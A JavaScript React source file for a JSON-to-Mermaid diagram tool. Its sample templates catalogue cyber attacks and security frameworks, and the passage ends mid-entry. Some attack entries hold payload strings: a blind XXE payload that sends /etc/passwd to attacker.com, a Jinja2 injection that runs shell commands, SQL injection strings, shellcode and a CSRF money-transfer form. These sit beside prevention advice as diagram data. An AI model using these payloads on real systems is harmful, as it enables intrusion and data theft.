import React, { StrictMode, useEffect, useRef, useState } from "https://esm.sh/react";
import { createRoot } from "https://esm.sh/react-dom/client";
import mermaid from "https://esm.sh/mermaid";
createRoot(document.getElementById("root")).render(React.createElement(StrictMode, null,
    React.createElement(IconSprites, null),
    React.createElement(JSONToMermaid, null)));
function CopyButton({ text }) {
    const copyTimeout = 750;
    const copyFrameId = useRef(0);
    const [status, setStatus] = useState(CopyStatus.Default);
    const isCopying = status !== CopyStatus.Default;
    const buttonProps = {
        [CopyStatus.Default]: {
            color: "text-gray-600 dark:text-gray-300",
            icon: "copy",
            title: "Copy"
        },
        [CopyStatus.Failed]: {
            color: "text-red-600 dark:text-red-400",
            icon: "error",
            title: "Failed"
        },
        [CopyStatus.Success]: {
            color: "text-green-600 dark:text-green-400",
            icon: "check",
            title: "Copied!"
        }
    };
    const { color, icon, title } = buttonProps[status];
    const bg = isCopying ? "" : "bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600";
    const buttonClass = `${bg} rounded ${color} flex gap-1 justify-center items-center relative w-9 h-9 transition focus:outline-none focus:ring focus:ring-blue-400`;
    /** Copy the outputted ASCII art to the clipboard (secure connection required). */
    async function outputCopy() {
        if (status !== CopyStatus.Default)
            return;
        try {
            await navigator.clipboard.writeText(text);
            setStatus(CopyStatus.Success);
        }
        catch (_a) {
            setStatus(CopyStatus.Failed);
            alert("Connection isn’t secure for copying to the clipboard!");
        }
    }
    useEffect(() => {
        const resetCopyStatus = () => {
            setStatus(CopyStatus.Default);
        };
        clearTimeout(copyFrameId.current);
        copyFrameId.current = setTimeout(resetCopyStatus, copyTimeout);
        return () => clearTimeout(copyFrameId.current);
    }, [status]);
    return (React.createElement("button", { className: buttonClass, type: "button", title: title, onClick: outputCopy },
        React.createElement(Icon, { icon: icon }),
        isCopying && React.createElement("span", { className: "animate-[tip-fade_0.75s_linear] bg-gray-900 dark:bg-gray-100 rounded text-gray-100 dark:text-gray-900 text-xs mb-1.5 px-1.5 py-0.5 absolute bottom-full left-1/2 -translate-x-1/2 transition", "aria-hidden": "true" }, title)));
}
function Icon({ icon, size = 16 }) {
    const href = `#${icon}`;
    return (React.createElement("svg", { className: "text-current", width: `${size}px`, height: `${size}px`, "aria-hidden": "true" },
        React.createElement("use", { href: href })));
}
const ThemeToggle = ({ isDarkMode, onToggle }) => React.createElement("button", {
    className: `fixed top-4 right-4 z-50 w-12 h-12 rounded-full flex items-center justify-center transition-all duration-300 border-2 shadow-lg hover:shadow-xl transform hover:scale-105 active:scale-95 ${
        isDarkMode 
            ? 'bg-gray-800 hover:bg-gray-700 border-gray-600 text-yellow-400 hover:text-yellow-300' 
            : 'bg-yellow-100 hover:bg-yellow-200 border-yellow-300 text-yellow-600 hover:text-yellow-700'
    } touch-manipulation`,
    onClick: onToggle,
    title: isDarkMode ? 'Switch to Light Mode' : 'Switch to Dark Mode'
}, React.createElement("div", { className: "transition-transform duration-300" },
    React.createElement(Icon, { icon: isDarkMode ? "moon" : "sun", size: 20 })));

function IconSprites() {
    const viewBox = "0 0 16 16";
    return (React.createElement("svg", { width: "0", height: "0", display: "none" },
        React.createElement("symbol", { id: "check", viewBox: viewBox },
            React.createElement("polyline", { fill: "none", stroke: "currentcolor", strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: "2", points: "1 8,6 13,15 3" })),
        React.createElement("symbol", { id: "copy", viewBox: viewBox },
            React.createElement("g", { fill: "none", stroke: "currentcolor", strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: "2" },
                React.createElement("polyline", { points: "11 1,2 1,2 12" }),
                React.createElement("polygon", { points: "5 4,14 4,14 15,5 15" }))),
        React.createElement("symbol", { id: "error", viewBox: viewBox },
            React.createElement("polyline", { stroke: "currentcolor", strokeLinecap: "round", strokeWidth: "4", points: "8 2,8 8" }),
            React.createElement("circle", { fill: "currentcolor", r: "2", cx: "8", cy: "14" })),
        React.createElement("symbol", { id: "select", viewBox: viewBox },
            React.createElement("polyline", { fill: "none", stroke: "currentcolor", strokeLinecap: "round", strokeLinejoin: "round", strokeWidth: "2", points: "4 6,8 10,12 6" })),
        React.createElement("symbol", { id: "sun", viewBox: "0 0 24 24" },
            React.createElement("circle", { cx: "12", cy: "12", r: "5", fill: "currentcolor", stroke: "none" }),
            React.createElement("path", { d: "M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round" })),
        React.createElement("symbol", { id: "moon", viewBox: "0 0 24 24" },
            React.createElement("path", { d: "M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z", fill: "currentcolor", stroke: "none" })),
        React.createElement("symbol", { id: "download", viewBox: "0 0 24 24" },
            React.createElement("path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }),
            React.createElement("polyline", { points: "7,10 12,15 17,10", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }),
            React.createElement("line", { x1: "12", y1: "15", x2: "12", y2: "3", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" })),
        React.createElement("symbol", { id: "fullscreen", viewBox: "0 0 24 24" },
            React.createElement("path", { d: "M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" })),
        React.createElement("symbol", { id: "fullscreen-exit", viewBox: "0 0 24 24" },
            React.createElement("path", { d: "M8 3v3a2 2 0 0 1-2 2H3m18 0h-3a2 2 0 0 1-2-2V3m0 18v-3a2 2 0 0 1 2-2h3M3 16h3a2 2 0 0 1 2 2v3", fill: "none", stroke: "currentcolor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }))));
}
// Cybersecurity Attack Templates
const CYBER_ATTACK_TEMPLATES = {
    "xss": {
        name: "Cross-Site Scripting (XSS)",
        description: "Malicious script injection into web applications",
        data: {
            "attack_type": "XSS",
            "attack_vector": "Reflected XSS",
            "target": {
                "application": "E-commerce Website",
                "vulnerable_parameter": "search_query",
                "url": "https://shop.example.com/search"
            },
            "payload": {
                "script": "<script>alert('XSS')</script>",
                "encoded": "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "bypass_techniques": ["Event handlers", "Filter evasion", "Encoding"]
            },
            "impact": {
                "severity": "High",
                "consequences": ["Session hijacking", "Data theft", "Defacement", "Malware distribution"]
            },
            "prevention": {
                "input_validation": "Sanitize user input",
                "output_encoding": "Encode output data",
                "csp": "Content Security Policy",
                "httponly": "HttpOnly cookies"
            }
        }
    },
    "csrf": {
        name: "Cross-Site Request Forgery (CSRF)",
        description: "Unauthorized actions performed on behalf of authenticated users",
        data: {
            "attack_type": "CSRF",
            "attack_vector": "State-changing request",
            "target": {
                "application": "Banking Website",
                "endpoint": "/transfer",
                "method": "POST"
            },
            "attack_flow": {
                "step1": "User logs into banking site",
                "step2": "User visits malicious site",
                "step3": "Malicious site sends request to banking site",
                "step4": "Banking site processes request with user's session"
            },
            "payload": {
                "html_form": "<form action='https://bank.com/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form>",
                "javascript": "fetch('https://bank.com/transfer', {method: 'POST', body: 'amount=1000&to=attacker'})"
            },
            "prevention": {
                "csrf_tokens": "Unique tokens per request",
                "same_site_cookies": "Strict SameSite policy",
                "referer_validation": "Check HTTP Referer header",
                "double_submit": "Double submit cookie pattern"
            }
        }
    },
    "ddos": {
        name: "Distributed Denial of Service (DDoS)",
        description: "Overwhelming target with traffic from multiple sources",
        data: {
            "attack_type": "DDoS",
            "attack_vector": "Volume-based attack",
            "target": {
                "website": "https://example.com",
                "server_capacity": "1000 requests/second",
                "attack_volume": "10000 requests/second"
            },
            "attack_sources": {
                "botnet_size": 10000,
                "geographic_distribution": "Global",
                "attack_duration": "24 hours"
            },
            "attack_methods": {
                "syn_flood": "TCP SYN flood",
                "udp_flood": "UDP packet flood",
                "http_flood": "HTTP request flood",
                "amplification": "DNS amplification"
            },
            "mitigation": {
                "rate_limiting": "Limit requests per IP",
                "cdn": "Content Delivery Network",
                "load_balancing": "Distribute traffic",
                "firewall": "Block malicious IPs"
            }
        }
    },
    "dos": {
        name: "Denial of Service (DoS)",
        description: "Single-source attack to make service unavailable",
        data: {
            "attack_type": "DoS",
            "attack_vector": "Resource exhaustion",
            "target": {
                "service": "Web Server",
                "vulnerability": "Slowloris attack",
                "port": 80
            },
            "attack_techniques": {
                "slowloris": "Slow HTTP headers",
                "slow_post": "Slow HTTP POST",
                "tcp_flood": "TCP connection flood",
                "memory_exhaustion": "Memory consumption attack"
            },
            "impact": {
                "availability": "Service unavailable",
                "response_time": "Increased latency",
                "resource_usage": "High CPU/Memory usage"
            },
            "detection": {
                "monitoring": "Traffic analysis",
                "anomaly_detection": "Unusual patterns",
                "thresholds": "Request rate limits"
            }
        }
    },
    "xxe": {
        name: "XML External Entity (XXE)",
        description: "XML parsing vulnerability allowing external entity processing",
        data: {
            "attack_type": "XXE",
            "attack_vector": "XML external entity",
            "target": {
                "application": "File upload service",
                "xml_parser": "DOM parser",
                "endpoint": "/upload"
            },
            "payload": {
                "xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "blind_xxe": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.dtd'>%xxe;]><foo>test</foo>",
                "dtd_file": "<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?data=%file;\">'>%eval;%exfil;"
            },
            "attack_scenarios": {
                "file_disclosure": "Read local files",
                "ssrf": "Server-Side Request Forgery",
                "dos": "Denial of Service",
                "rce": "Remote Code Execution"
            },
            "prevention": {
                "disable_entities": "Disable external entities",
                "input_validation": "Validate XML input",
                "whitelist": "Allow only safe entities",
                "parser_config": "Secure parser configuration"
            }
        }
    },
    "html_injection": {
        name: "HTML Template Injection",
        description: "Injection of malicious HTML/template code",
        data: {
            "attack_type": "HTML Template Injection",
            "attack_vector": "Template engine injection",
            "target": {
                "framework": "Jinja2 (Python)",
                "template": "User profile page",
                "vulnerable_parameter": "username"
            },
            "payload": {
                "jinja2": "{{config.items()}}",
                "ssti": "{{''.__class__.__mro__[1].__subclasses__()}}",
                "rce": "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}"
            },
            "attack_impact": {
                "information_disclosure": "Configuration data",
                "file_access": "Read server files",
                "rce": "Remote code execution",
                "data_exfiltration": "Sensitive data theft"
            },
            "prevention": {
                "input_sanitization": "Sanitize user input",
                "template_sandboxing": "Sandbox template execution",
                "output_encoding": "Encode template output",
                "secure_config": "Secure template configuration"
            }
        }
    },
    "sql_injection": {
        name: "SQL Injection",
        description: "Malicious SQL code injection into database queries",
        data: {
            "attack_type": "SQL Injection",
            "attack_vector": "Database query manipulation",
            "target": {
                "database": "MySQL/PostgreSQL",
                "vulnerable_parameter": "user_id",
                "endpoint": "/api/users"
            },
            "payload": {
                "union_based": "' UNION SELECT username, password FROM users--",
                "boolean_based": "' OR '1'='1",
                "time_based": "'; WAITFOR DELAY '00:00:05'--",
                "error_based": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            },
            "attack_techniques": {
                "union_queries": "Extract data using UNION",
                "boolean_blind": "Boolean-based blind injection",
                "time_based": "Time-based blind injection",
                "error_based": "Error-based injection",
                "stacked_queries": "Multiple query execution"
            },
            "impact": {
                "data_breach": "Sensitive data exposure",
                "authentication_bypass": "Login bypass",
                "privilege_escalation": "Database admin access",
                "data_manipulation": "Data modification/deletion"
            },
            "prevention": {
                "parameterized_queries": "Use prepared statements",
                "input_validation": "Validate and sanitize input",
                "least_privilege": "Minimal database permissions",
                "waf": "Web Application Firewall"
            }
        }
    },
    "buffer_overflow": {
        name: "Buffer Overflow",
        description: "Exploitation of memory buffer boundaries",
        data: {
            "attack_type": "Buffer Overflow",
            "attack_vector": "Memory corruption",
            "target": {
                "application": "C/C++ application",
                "vulnerable_function": "strcpy()",
                "memory_location": "Stack/Heap"
            },
            "exploit_techniques": {
                "stack_overflow": "Overflow stack buffer",
                "heap_overflow": "Overflow heap buffer",
                "format_string": "Format string vulnerability",
                "integer_overflow": "Integer boundary violation"
            },
            "payload": {
                "shellcode": "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
                "rop_chain": "Return-oriented programming",
                "ret2libc": "Return to libc attack"
            },
            "impact": {
                "code_execution": "Arbitrary code execution",
                "privilege_escalation": "Root/admin access",
                "system_crash": "Application/service crash",
                "data_corruption": "Memory corruption"
            },
            "prevention": {
                "stack_canaries": "Stack protection mechanisms",
                "aslr": "Address Space Layout Randomization",
                "dep": "Data Execution Prevention",
                "bounds_checking": "Array bounds validation"
            }
        }
    },
    "privilege_escalation": {
        name: "Privilege Escalation",
        description: "Gaining higher system privileges than intended",
        data: {
            "attack_type": "Privilege Escalation",
            "attack_vector": "System privilege abuse",
            "target": {
                "system": "Linux/Windows server",
                "current_privilege": "User level",
                "target_privilege": "Administrator/Root"
            },
            "escalation_methods": {
                "kernel_exploits": "Operating system vulnerabilities",
                "misconfigurations": "System misconfigurations",
                "weak_permissions": "Incorrect file permissions",
                "service_abuse": "Service account exploitation"
            },
            "exploit_techniques": {
                "sudo_abuse": "Sudo misconfiguration abuse",
                "suid_binaries": "Setuid binary exploitation",
                "capability_abuse": "Linux capability abuse",
                "token_manipulation": "Windows token manipulation"
            },
            "impact": {
                "full_system_access": "Complete system control",
                "data_access": "Access to sensitive data",
                "persistence": "Maintain elevated access",
                "lateral_movement": "Move to other systems"
            },
            "prevention": {
                "least_privilege": "Minimal required permissions",
                "regular_updates": "Keep systems patched",
                "access_review": "Regular privilege audits",
                "monitoring": "Privilege escalation detection"
            }
        }
    },
    "social_engineering": {
        name: "Social Engineering",
        description: "Psychological manipulation to gain sensitive information",
        data: {
            "attack_type": "Social Engineering",
            "attack_vector": "Human psychology manipulation",
            "target": {
                "victim": "Organization employees",
                "goal": "Sensitive information access",
                "method": "Psychological manipulation"
            },
            "attack_techniques": {
                "pretexting": "False identity creation",
                "baiting": "Tempting offers with malware",
                "quid_pro_quo": "Something for something",
                "tailgating": "Physical access following"
            },
            "attack_scenarios": {
                "phone_calls": "Impersonation via phone",
                "email_spoofing": "Fake email communications",
                "physical_visits": "On-site impersonation",
                "online_profiles": "Fake social media profiles"
            },
            "psychological_tactics": {
                "authority": "Claiming authority position",
                "urgency": "Creating time pressure",
                "fear": "Threatening consequences",
                "reciprocity": "Offering something first"
            },
            "prevention": {
                "security_awareness": "Employee training",
                "verification": "Identity verification procedures",
                "policies": "Clear security policies",
                "reporting": "Incident reporting procedures"
            }
        }
    },
    "phishing": {
        name: "Phishing",
        description: "Fraudulent attempts to obtain sensitive information",
        data: {
            "attack_type": "Phishing",
            "attack_vector": "Deceptive communications",
            "target": {
                "victims": "Email users",
                "goal": "Credentials and sensitive data",
                "method": "Fake websites and emails"
            },
            "phishing_types": {
                "email_phishing": "Mass email campaigns",
                "spear_phishing": "Targeted individual attacks",
                "whaling": "High-value target attacks",
                "smishing": "SMS-based phishing"
            },
            "attack_techniques": {
                "url_spoofing": "Fake website URLs",
                "email_spoofing": "Fake sender addresses",
                "attachment_malware": "Malicious email attachments",
                "credential_harvesting": "Fake login pages"
            },
            "payload": {
                "fake_login": "Imitation login page",
                "malicious_link": "https://fake-bank.com/login",
                "attachment": "invoice.pdf.exe",
                "urgent_message": "Your account will be closed!"
            },
            "impact": {
                "credential_theft": "Username/password compromise",
                "financial_loss": "Money theft",
                "data_breach": "Sensitive data exposure",
                "malware_infection": "System compromise"
            },
            "prevention": {
                "email_filtering": "Advanced email security",
                "user_training": "Phishing awareness training",
                "multi_factor": "Multi-factor authentication",
                "url_verification": "Link verification tools"
            }
        }
    },
    "ransomware": {
        name: "Ransomware",
        description: "Malicious software that encrypts files for ransom",
        data: {
            "attack_type": "Ransomware",
            "attack_vector": "File encryption malware",
            "target": {
                "victims": "Organizations and individuals",
                "goal": "Financial extortion",
                "method": "File encryption"
            },
            "ransomware_families": {
                "wannacry": "WannaCry ransomware",
                "locky": "Locky ransomware",
                "cerber": "Cerber ransomware",
                "ryuk": "Ryuk ransomware"
            },
            "attack_techniques": {
                "email_attachments": "Malicious email attachments",
                "exploit_kits": "Drive-by downloads",
                "remote_desktop": "RDP exploitation",
                "lateral_movement": "Network propagation"
            },
            "encryption_methods": {
                "symmetric": "AES encryption",
                "asymmetric": "RSA public key",
                "hybrid": "Combined encryption methods",
                "file_targeting": "Specific file types"
            },
            "impact": {
                "data_encryption": "Files become inaccessible",
                "business_disruption": "Operations halt",
                "financial_loss": "Ransom payments",
                "reputation_damage": "Public trust loss"
            },
            "prevention": {
                "backups": "Regular data backups",
                "updates": "System and software updates",
                "email_security": "Advanced email protection",
                "network_segmentation": "Network isolation"
            }
        }
    },
    "insider_threats": {
        name: "Insider Threats",
        description: "Security risks from within the organization",
        data: {
            "attack_type": "Insider Threats",
            "attack_vector": "Internal access abuse",
            "target": {
                "organization": "Internal systems and data",
                "threat_source": "Current/former employees",
                "goal": "Data theft or sabotage"
            },
            "threat_types": {
                "malicious_insider": "Intentional harm",
                "negligent_insider": "Accidental exposure",
                "compromised_insider": "Account takeover",
                "third_party": "Contractor/partner access"
            },
            "attack_techniques": {
                "data_exfiltration": "Unauthorized data copying",
                "privilege_abuse": "Excessive access usage",
                "sabotage": "System damage",
                "espionage": "Corporate espionage"
            },
            "motivations": {
                "financial_gain": "Monetary benefits",
                "revenge": "Retaliation against employer",
                "ideology": "Political/religious beliefs",
                "competition": "Competitive advantage"
            },
            "impact": {
                "data_breach": "Sensitive data exposure",
                "financial_loss": "Revenue and reputation damage",
                "intellectual_property": "Trade secret theft",
                "operational_disruption": "Business process interruption"
            },
            "prevention": {
                "access_controls": "Role-based access control",
                "monitoring": "User activity monitoring",
                "background_checks": "Employee screening",
                "data_loss_prevention": "DLP solutions"
            }
        }
    },
    "man_in_the_middle": {
        name: "Man-in-the-Middle (MITM)",
        description: "Intercepting and altering communications between parties",
        data: {
            "attack_type": "Man-in-the-Middle",
            "attack_vector": "Communication interception",
            "target": {
                "communication": "Network traffic",
                "parties": "Client and server",
                "method": "Traffic interception"
            },
            "attack_techniques": {
                "arp_spoofing": "ARP table manipulation",
                "dns_spoofing": "DNS cache poisoning",
                "ssl_stripping": "HTTPS downgrade",
                "wifi_eavesdropping": "Wireless traffic capture"
            },
            "attack_scenarios": {
                "public_wifi": "Unsecured wireless networks",
                "rogue_access_point": "Fake WiFi networks",
                "network_compromise": "Router/switch compromise",
                "certificate_abuse": "SSL certificate manipulation"
            },
            "payload": {
                "fake_website": "Imitation legitimate site",
                "stolen_credentials": "Intercepted login data",
                "modified_data": "Altered communication content",
                "injected_malware": "Malicious code injection"
            },
            "impact": {
                "credential_theft": "Login information capture",
                "data_interception": "Sensitive data exposure",
                "session_hijacking": "Active session takeover",
                "malware_injection": "Malicious code delivery"
            },
            "prevention": {
                "encryption": "End-to-end encryption",
                "certificate_pinning": "SSL certificate validation",
                "vpn": "Virtual Private Networks",
                "network_monitoring": "Traffic analysis"
            }
        }
    },
    "zero_day": {
        name: "Zero-Day Exploits",
        description: "Exploiting unknown vulnerabilities before patches",
        data: {
            "attack_type": "Zero-Day Exploit",
            "attack_vector": "Unknown vulnerability exploitation",
            "target": {
                "software": "Unpatched applications",
                "vulnerability": "Undisclosed security flaw",
                "timeline": "Before vendor awareness"
            },
            "exploit_characteristics": {
                "unknown_vulnerability": "No prior knowledge",
                "no_patch": "No available fix",
                "high_value": "Significant impact potential",
                "limited_detection": "Hard to detect"
            },
            "attack_lifecycle": {
                "discovery": "Vulnerability found",
                "exploit_development": "Proof of concept creation",
                "weaponization": "Attack tool development",
                "deployment": "Actual attack execution"
            },
            "impact": {
                "system_compromise": "Complete system control",
                "data_breach": "Massive data exposure",
                "network_persistence": "Long-term access",
                "lateral_movement": "Network-wide compromise"
            },
            "prevention": {
                "defense_in_depth": "Multiple security layers",
                "behavioral_analysis": "Anomaly detection",
                "network_segmentation": "Traffic isolation",
                "incident_response": "Rapid response procedures"
            }
        }
    },
    "comprehensive_cyber_attacks": {
        name: "Comprehensive Cyber Attacks",
        description: "Complete catalog of malware, network attacks, web application attacks, and advanced persistent threats",
        data: {
            "name": "Comprehensive Cyber Security Attacks",
            "category": "Complete Attack Taxonomy",
            "malware_types": {
                "traditional_malware": [
                    "Virus",
                    "Worm", 
                    "Trojan (Trojan horse)",
                    "Backdoor",
                    "Rootkit",
                    "Ransomware",
                    "Spyware",
                    "Adware",
                    "Keylogger",
                    "Logic bomb",
                    "Bootkit",
                    "Fileless malware",
                    "Dropper",
                    "Loader",
                    "Botnet (bot)"
                ]
            },
            "network_attacks": {
                "denial_of_service": [
                    "Denial of Service (DoS)",
                    "Distributed Denial of Service (DDoS)",
                    "SYN flood",
                    "UDP flood",
                    "ICMP flood / ping flood",
                    "Amplification attacks (DNS amplification, NTP amplification)",
                    "Smurf attack",
                    "Teardrop attack",
                    "Fragmentation attacks"
                ],
                "man_in_the_middle": [
                    "Man-in-the-Middle (MITM)",
                    "ARP spoofing / ARP poisoning",
                    "DNS spoofing / DNS cache poisoning",
                    "DNS hijacking",
                    "DHCP spoofing",
                    "VLAN hopping",
                    "Rogue access point (evil twin)",
                    "Packet sniffing / eavesdropping",
                    "Replay attack",
                    "Session hijacking / cookie hijacking",
                    "TCP/IP hijacking",
                    "SSL/TLS stripping (downgrade attacks)"
                ]
            },
            "web_application_attacks": [
                "Cross-Site Scripting (XSS) — reflected, stored, DOM-based",
                "SQL Injection (SQLi)",
                "Cross-Site Request Forgery (CSRF / XSRF)",
                "Remote Code Execution (RCE)",
                "Local File Inclusion (LFI) / Remote File Inclusion (RFI)",
                "Server-Side Request Forgery (SSRF)",
                "Insecure deserialization",
                "XML External Entity (XXE) attack",
                "Directory traversal / path traversal",
                "Open redirect",
                "Clickjacking (UI redress)",
                "Broken access control (horizontal/vertical privilege escalation)",
                "Authentication bypass",
                "Mass assignment / parameter tampering",
                "Business Logic Abuse",
                "Directory indexing / information disclosure",
                "Improper error handling / verbose errors"
            ],
            "credential_attacks": [
                "Brute-force attack",
                "Password spraying",
                "Credential stuffing",
                "Dictionary attack",
                "Rainbow table attack",
                "Pass-the-Hash",
                "Pass-the-Ticket",
                "Key reuse / weak key exploitation",
                "Account takeover (ATO)",
                "SIM swapping / SIM hijack",
                "MFA bypass techniques"
            ],
            "social_engineering": [
                "Phishing",
                "Spear phishing",
                "Whaling (targeting executives)",
                "Clone phishing",
                "Vishing (voice phishing)",
                "Smishing (SMS phishing)",
                "Baiting",
                "Pretexting",
                "Tailgating / piggybacking (physical access)",
                "Business Email Compromise (BEC / CEO fraud)",
                "Quid pro quo social engineering"
            ],
            "supply_chain_attacks": [
                "Software supply chain compromise (trojanized libraries, compromised CI/CD)",
                "Hardware/firmware tampering",
                "Dependency hijacking",
                "Third-party account compromise"
            ],
            "endpoint_attacks": [
                "Buffer overflow / stack-based overflow",
                "Heap overflow",
                "Return-oriented programming (ROP)",
                "Privilege escalation (local / vertical)",
                "Exploit chaining",
                "DLL/so hijacking",
                "Kernel-mode exploits"
            ],
            "cryptographic_attacks": [
                "Brute-force key search",
                "Known-plaintext attack",
                "Chosen-plaintext attack",
                "Chosen-ciphertext attack",
                "Ciphertext-only attack",
                "Padding oracle attack",
                "Birthday attack / collision attack",
                "Preimage attack",
                "Meet-in-the-middle attack",
                "Side-channel crypto attacks (timing, power analysis, electromagnetic)"
            ],
            "side_channel_attacks": [
                "Timing attack",
                "Power analysis attack",
                "Electromagnetic (EM) leakage attack",
                "Fault injection",
                "Cold boot attack",
                "Evil maid attack (physical access tampering)",
                "Hardware implant / tampering",
                "Dumpster diving (data recovery from trash)"
            ],
            "email_attacks": [
                "Email spoofing",
                "Spear / mass phishing",
                "Mail bombing",
                "Malicious attachments / drive-by attachments"
            ],
            "dns_infrastructure_attacks": [
                "DNS amplification (amplification DDoS)",
                "NXDOMAIN attack",
                "DNS rebinding"
            ],
            "iot_mobile_attacks": [
                "Mirai-style IoT botnet attacks",
                "Firmware rooting / bricking",
                "Unauthenticated APIs exploitation",
                "Mobile app sideloading / repackaging attacks",
                "SMS interception / OTP interception"
            ],
            "cloud_attacks": [
                "Instance/container escape",
                "Cloud misconfiguration attacks (open S3 buckets, improper IAM)",
                "Metadata service SSRF / metadata theft (cloud credential theft)",
                "VM snapshot / image poisoning",
                "Cross-tenant data leakage"
            ],
            "ai_ml_attacks": [
                "Model evasion (adversarial examples)",
                "Model poisoning (training data poisoning)",
                "Model inversion / extraction",
                "Data inference attacks"
            ],
            "data_exfiltration": [
                "Steganography (hidden data in images/audio)",
                "DNS tunneling",
                "HTTP/HTTPS covert channel",
                "ICMP tunneling",
                "Exfiltration over cloud file stores / social platforms"
            ],
            "advanced_attacks": [
                "Zero-day exploit (unknown vulnerability exploit)",
                "Advanced Persistent Threat (APT) — long-term targeted intrusions",
                "Nation-state attacks / espionage"
            ],
            "miscellaneous_attacks": [
                "Watering hole attack (compromise a site frequented by target)",
                "Drive-by download (malicious site triggers download)",
                "Credential harvesting pages",
                "Click-fraud / ad-fraud",
                "Time-of-check to time-of-use (TOCTOU) race conditions",
                "Resource exhaustion (disk, CPU, memory)",
                "Side-loading & DLL planting"
            ]
        }
    },
    "owasp_top_10": {
        name: "OWASP Top 10",
        description: "Open Web Application Security Project Top 10 vulnerabilities",
        data: {
            "name": "OWASP Top 10 Security Risks",
            "category": "Web Application Security",
            "top_10_vulnerabilities": [
                "A01:2021 - Broken Access Control",
                "A02:2021 - Cryptographic Failures", 
                "A03:2021 - Injection",
                "A04:2021 - Insecure Design",
                "A05:2021 - Security Misconfiguration",
                "A06:2021 - Vulnerable and Outdated Components",
                "A07:2021 - Identification and Authentication Failures",
                "A08:2021 - Software and Data Integrity Failures",
                "A09:2021 - Security Logging and Monitoring Failures",
                "A10:2021 - Server-Side Request Forgery (SSRF)"
            ],
            "impact_levels": {
                "critical": ["A01", "A02", "A03", "A04"],
                "high": ["A05", "A06", "A07"],
                "medium": ["A08", "A09", "A10"]
            },
            "prevention_strategies": {
                "secure_coding": "Follow secure coding practices",
                "regular_testing": "Conduct security testing",
                "dependency_management": "Keep components updated",
                "access_controls": "Implement proper access controls",
                "encryption": "Use strong encryption",
                "monitoring": "Implement security monitoring"
            }
        }
    },
    "nist_cybersecurity_framework": {
        name: "NIST Cybersecurity Framework",
        description: "National Institute of Standards and Technology cybersecurity framework",
        data: {
            "name": "NIST Cybersecurity Framework",
            "category": "Cybersecurity Governance",
            "core_functions": {
                "identify": [
                    "Asset Management",
                    "Business Environment", 
                    "Governance",
                    "Risk Assessment",
                    "Risk Management Strategy"
                ],
                "protect": [
                    "Identity Management and Access Control",
                    "Awareness and Training",
                    "Data Security",
                    "Information Protection Processes and Procedures",
                    "Maintenance",
                    "Protective Technology"
                ],
                "detect": [
                    "Anomalies and Events",
                    "Security Continuous Monitoring",
                    "Detection Processes"
                ],
                "respond": [
                    "Response Planning",
                    "Communications",
                    "Analysis",
                    "Mitigation",
                    "Improvements"
                ],
                "recover": [
                    "Recovery Planning",
                    "Improvements",
                    "Communications"
                ]
            },
            "implementation_tiers": {
                "tier_1": "Partial",
                "tier_2": "Risk Informed", 
                "tier_3": "Repeatable",
                "tier_4": "Adaptive"
            }
        }
    },
    "iso_27001": {
        name: "ISO 27001",
        description: "International standard for information security management systems",
        data: {
            "name": "ISO 27001 Information Security Management",
            "category": "Information Security Standard",
            "control_categories": {
                "information_security_policies": [
                    "Management direction for information security",
                    "Policies for information security"
                ],
                "organization_of_information_security": [
                    "Internal organization",
                    "Mobile devices and teleworking"
                ],
                "human_resource_security": [
                    "Prior to employment",
                    "During employment",
                    "Termination and change of employment"
                ],
                "asset_management": [
                    "Responsibility for assets",
                    "Information classification",
                    "Media handling"
                ],
                "access_control": [
                    "Business requirement for access control",
                    "User access management",
                    "User responsibilities",
                    "System and application access control"
                ],
                "cryptography": [
                    "Key management",
                    "Cryptographic controls"
                ],
                "physical_and_environmental_security": [
                    "Equipment",
                    "Supporting utilities",
                    "Cabling security",
                    "Equipment maintenance",
                    "Secure disposal or reuse of equipment",
                    "Clear desk and clear screen policy",
                    "Removal of property"
                ],
                "operations_security": [
                    "Operational procedures and responsibilities",
                    "Protection from malware",
                    "Backup",
                    "Logging and monitoring",
                    "Control of operational software",
                    "Technical vulnerability management",
                    "Information systems audit considerations"
                ],
                "communications_security": [
                    "Network security management",
                    "Information transfer"
                ],
                "system_acquisition_development_and_maintenance": [
                    "Security requirements of information systems",
                    "Security in development and support processes",
                    "Test data"
                ],
                "supplier_relationships": [
                    "Information security in supplier relationships",
                    "Supplier service delivery management"
                ],
                "information_security_incident_management": [
                    "Management of information security incidents and improvements"
                ],
                "information_security_aspects_of_business_continuity_management": [
                    "Information security continuity",
                    "Redundancies of information processing facilities"
                ],
